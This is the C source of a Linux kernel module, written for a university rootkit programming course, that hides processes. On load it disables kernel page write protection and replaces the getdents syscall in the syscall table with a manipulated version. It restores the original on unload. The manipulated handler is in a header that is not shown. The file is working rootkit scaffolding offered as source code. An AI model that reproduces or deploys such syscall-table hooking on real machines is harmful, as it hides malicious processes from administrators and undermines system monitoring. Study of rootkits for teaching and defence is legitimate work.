/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/delay.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>

#include "getdents.h"
#include "include.h"
#include "sysmap.h"

/* Information for modinfo */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Guru Chandrasekhara, Martin Herrmann");

/*
 * multiple counters to ensure every process has left our manipulated 
 * syscalls before we unload our module.
 */
int getdents_call_counter = 0;

/* pointers to some important kernel functions/resources */
static void **sys_call_table;
asmlinkage int (*original_getdents) (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*syscall_readlinkat) (int dirfd, const char *path, char *buf, size_t bufsiz);

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{	
	printk(KERN_INFO "Loading process-hider LKM...\n");
	
	/* get the pointer to the sys_call_table */
	sys_call_table = (void *) sysmap_sys_call_table;

	/* get the 'readlinkat' syscall */
	syscall_readlinkat = (void*) sys_call_table[__NR_readlinkat];

	/* disable the write protection */
	disable_page_protection();

	/* replace the syscall getdents */
	original_getdents = (void *) sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = (int *) manipulated_getdents;
	
	
	/* reenable the write protection */
	enable_page_protection();
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	/* disable write protection */
	disable_page_protection();
	
	/* restore the old syscall */
	sys_call_table[__NR_getdents] = (int *) original_getdents;

	/* reenable write protection */
	enable_page_protection();

	/* make sure that all processes have left our manipulated syscall */
	while(getdents_call_counter > 0) {
		msleep(10);
	}
	
	/* Finally, log the unloading */
	printk(KERN_INFO "Unloading process-hider... bye!\n");
}
